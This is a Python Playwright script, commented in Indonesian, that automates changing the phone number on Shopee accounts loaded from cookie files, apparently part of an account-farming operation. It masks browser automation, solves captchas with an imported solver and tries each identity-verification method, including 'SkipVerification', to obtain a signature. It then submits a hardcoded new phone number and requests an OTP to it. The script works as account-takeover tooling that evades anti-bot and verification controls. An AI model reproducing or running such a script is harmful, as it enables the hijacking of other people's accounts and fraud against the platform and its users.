"""ivs_gate.py — buka /verify/ivs, SOLVE captcha, lalu jalankan token/verify.

Kenapa: token/verify = 211 karena state IVS server belum aktif.
State dibuat saat /verify/ivs dirender DAN captcha lolos.

Langkah:
  1. Buka /verify/ivs dengan cookie akun
  2. Kalau kena /verify/captcha -> solve pakai SadCaptcha
  3. Setelah lolos, halaman IVS render, API method dipanggil browser
  4. Token/verify dipanggil BROWSER sendiri -> tangkap signature
  5. Kalau signature dapat -> lanjut precheck + send_vcode

Output: ivs_gate.json
"""
import json, sys, time, re

sys.path.insert(0, "/root/shopee-farm")

CK = sys.argv[1] if len(sys.argv) > 1 else "ck_1553.txt"
MAXTRY = int(sys.argv[2]) if len(sys.argv) > 2 else 8
OUT = "/root/shopee-verify/ivs_gate.json"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")
PROXY = "http://127.0.0.1:18080"

ck = open(CK).read().strip()
ck_list = [{"name": k, "value": v, "domain": ".shopee.co.id", "path": "/"}
           for p in ck.split(";") if "=" in p
           for k, v in [p.strip().split("=", 1)]]


def log(*a):
    print(*a, flush=True)


try:
    import shopee_v6 as V6
    HAS_SOLVER = True
    log("solver: shopee_v6 loaded")
except Exception as e:
    HAS_SOLVER = False
    log(f"solver: TIDAK ADA ({str(e)[:60]})")

from playwright.sync_api import sync_playwright

rec = []

with sync_playwright() as pw:
    br = pw.chromium.launch(headless=True, args=[
        "--no-sandbox", "--disable-dev-shm-usage", "--window-size=1366,1000",
        "--disable-blink-features=AutomationControlled",
        "--use-gl=swiftshader", "--lang=id-ID"])
    ctx = br.new_context(user_agent=UA, locale="id-ID",
                         viewport={"width": 1366, "height": 1000},
                         timezone_id="Asia/Jakarta", proxy={"server": PROXY})
    ctx.add_cookies(ck_list)
    ctx.add_init_script(
        "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});"
        "window.chrome={runtime:{}};"
        "Object.defineProperty(navigator,'languages',{get:()=>['id-ID','id','en']});")
    pg = ctx.new_page()

    def onresp(r):
        u = r.url
        if any(k in u for k in ("ivs", "captcha", "change_phone", "otp")):
            try:
                body = r.text()[:1200]
            except Exception:
                body = ""
            rec.append({"u": u.split("shopee.co.id")[-1][:90],
                        "s": r.status, "b": body})

    pg.on("response", onresp)

    # 1. init flow dulu dari API (dapat ut)
    log("\n=== 1. init change_phone dari API ===")
    pg.goto("https://shopee.co.id/", wait_until="domcontentloaded", timeout=90000)
    pg.wait_for_timeout(12000)

    o = pg.evaluate(r"""
    async () => {
      const M='/api/v4/account/management';
      const post = async (p,b) => {
        const r = await fetch(p,{method:'POST',credentials:'include',
          headers:{'Content-Type':'application/json','X-API-SOURCE':'pc',
                   'X-Requested-With':'XMLHttpRequest','Accept':'application/json'},body:JSON.stringify(b||{})});
        let j=null; try{j=await r.json();}catch(e){}
        return {e:j&&j.error,d:j&&j.data};
      };
      const a = await post(M+'/change_phone_init',{});
      const b = await post(M+'/change_phone_init_v2',{});
      return {auth:(a.d||{}).auth_required,
              ut:(b.d||{}).ivs_utoken||'', cpt:(b.d||{}).change_phone_token||''};
    }""")
    UT = o.get("ut", "")
    CPT = o.get("cpt", "")
    log(f"  auth={o.get('auth')} ut={len(UT)}B cpt={len(CPT)}B")

    if not UT:
        log("❌ tidak dapat ivs_utoken")
        br.close()
        sys.exit(1)

    # 2. buka /verify/ivs — ini yang bikin state server aktif
    log("\n=== 2. buka /verify/ivs (state akan aktif) ===")
    url = f"https://shopee.co.id/verify/ivs?u_token={UT}&event=2"
    solved = False
    for attempt in range(1, MAXTRY + 1):
        log(f"\n--- attempt {attempt} ---")
        try:
            pg.goto(url, wait_until="domcontentloaded", timeout=70000)
        except Exception as e:
            log(f"  goto err: {str(e)[:70]}")
            time.sleep(3)
            continue
        pg.wait_for_timeout(6000)
        cur = pg.url
        log(f"  url: {cur[:85]}")

        if "verify/ivs" in cur:
            log("  ✅ DI HALAMAN IVS — state aktif!")
            solved = True
            break
        if "verify/captcha" in cur:
            log("  ⚠️ kena captcha — solve...")
            if not HAS_SOLVER:
                log("  ❌ solver tidak tersedia")
                break
            try:
                # pakai solver shopee_v6
                r = V6.solve_image_crawl(pg) if hasattr(V6, "solve_image_crawl") else None
                log(f"  solve_image_crawl: {r}")
                if not r or (isinstance(r, dict) and r.get("err")):
                    r2 = V6.solve_puzzle(pg) if hasattr(V6, "solve_puzzle") else None
                    log(f"  solve_puzzle: {r2}")
            except Exception as e:
                log(f"  solver err: {str(e)[:80]}")
            pg.wait_for_timeout(5000)
            continue
        if "verify/traffic" in cur:
            log("  ⚠️ traffic error — tunggu")
            pg.wait_for_timeout(6000)
            continue
        log(f"  halaman lain: {cur[:60]}")

    # 3. di halaman IVS — jalankan token/verify dari context ini
    if solved:
        log("\n=== 3. token/verify dari halaman IVS ===")
        r = pg.evaluate(r"""
        async (ut) => {
          const IVS='/api/v4/anti_fraud/ivs';
          const post = async (p,b,at) => {
            const h={'Content-Type':'application/json','X-API-SOURCE':'pc',
                     'X-Requested-With':'XMLHttpRequest','Accept':'application/json'};
            if (at !== undefined) h['x-app-type']=at;
            const r = await fetch(p,{method:'POST',credentials:'include',headers:h,
                                     body:JSON.stringify(b||{})});
            let j=null; try{j=await r.json();}catch(e){}
            return {s:r.status,e:j&&j.error,d:j&&j.data,raw:j};
          };
          const o={};
          const rm = await post(IVS+'/methods',{event:2,u_token:ut},'');
          const ms = Array.isArray(rm.d)?rm.d:((rm.d||{}).methods||[]);
          o.methods = ms.map(x=>({t:x.type,vt:(x.v_token||'').length}));
          o.tv=[];
          for (const m of ms) {
            const mt=m.type, VT=m.v_token||'';
            const sel = await post(IVS+'/method/select',
              {v_token:VT,method:mt,event:2,u_token:ut},'');
            const RT = (sel.raw&&sel.raw.r_token) || (sel.d&&sel.d.r_token) || VT;
            const NAMES={2:'Password',10:'NewShopeePayPin',1:'OTP',20:'DEVICE_TOKEN',100:'SkipVerification'};
            const MN=NAMES[mt]||String(mt);
            const tv = await post(IVS+'/token/verify',{
              method_name:MN,event:2,u_token:ut,r_token:RT,v_token:VT,
              shopee_df:'',misc:{seed:'',operation:0}},'');
            const sl = tv.d&&tv.d.signature?tv.d.signature.length:0;
            o.tv.push({t:mt,mn:MN,e:tv.e,sig:sl});
            if (tv.e===0&&sl) { o.HIT={mn:MN,mt:mt,sig:tv.d.signature}; break; }
            await new Promise(r=>setTimeout(r,900));
          }
          return o;
        }""", UT)

        log(f"  methods={r.get('methods')}")
        for t in r.get("tv", []):
            log(f"    type={t['t']:3d} {t['mn']:18s} err={t['e']} sig={t['sig']}")
        if r.get("HIT"):
            log(f"\n🟢🟢🟢🟢 SIGNATURE DAPAT! {len(r['HIT']['sig'])}B")

            # 4. lanjut precheck + send_vcode
            log("\n=== 4. precheck + send_vcode ===")
            r2 = pg.evaluate(r"""
            async ([cpt, sig, mn]) => {
              const M='/api/v4/account/management';
              const post = async (p,b) => {
                const r=await fetch(p,{method:'POST',credentials:'include',
                  headers:{'Content-Type':'application/json','X-API-SOURCE':'pc',
                           'X-Requested-With':'XMLHttpRequest','Accept':'application/json'},
                  body:JSON.stringify(b||{})});
                let j=null; try{j=await r.json();}catch(e){}
                return {e:j&&j.error,d:j&&j.data};
              };
              const o={};
              const pc = await post(M+'/change_phone_precheck_v2',{
                change_phone_token:cpt,new_phone:'6283191104601',
                ivs_signature:sig,ivs_method_name:mn});
              o.precheck={e:pc.e,d:pc.d};
              const st = await post('/api/v4/otp/get_settings_v2',
                {operation:0,change_phone_token:cpt});
              o.settings={e:st.e,d:st.d};
              const sv = await post('/api/v4/otp/send_vcode',{
                phone:'6283191104601',channel:1,operation:0,
                force_channel:false,supported_channels:[1],seed:''});
              o.send={e:sv.e,d:sv.d};
              return o;
            }""", [CPT, r["HIT"]["sig"], r["HIT"]["mn"]])
            log(f"  precheck: err={r2.get('precheck',{}).get('e')} {str(r2.get('precheck',{}).get('d'))[:130]}")
            log(f"  settings: err={r2.get('settings',{}).get('e')}")
            log(f"  send_vcode: err={r2.get('send',{}).get('e')} {str(r2.get('send',{}).get('d'))[:130]}")
        else:
            log("\n❌ signature tidak didapat dari halaman IVS")

        json.dump({"init": o, "tv": r, "net": rec[:40]},
                  open(OUT, "w"), indent=1)

    pg.screenshot(path="/root/shopee-verify/ivs_state.png", full_page=False)
    log(f"\n-> {OUT}  (net {len(rec)} rec)")
    br.close()

log("\n=== SELESAI ===")
